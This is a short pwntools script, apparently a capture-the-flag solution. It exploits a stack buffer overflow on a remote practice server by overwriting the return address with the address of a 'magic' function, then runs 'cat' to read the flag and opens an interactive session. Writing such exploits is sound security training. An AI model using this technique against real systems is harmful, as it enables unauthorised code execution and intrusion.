from pwn import *

# p = process("./helloctf")
p = remote('ctf.adl.tw', 10000)

pause()
# receive until "?" mark
p.recvuntil("?")

# send 0x18 bytes char to process to cause Stack Over FLow
# b"a" change a to byte type, fill [char array 0x10] and [previous rbp register 0x8]
payload = b"a" * 0x18
 
# magic:devil function
# p64 changes hex numbers to little endian
"""0x4011fb is the address of magic function"""
magic = p64(0x4011fb)

#put magic function to [return address of input function]
payload += magic
p.sendline(payload)

p.sendline('cat /home/`whoami`/flag')

p.interactive()
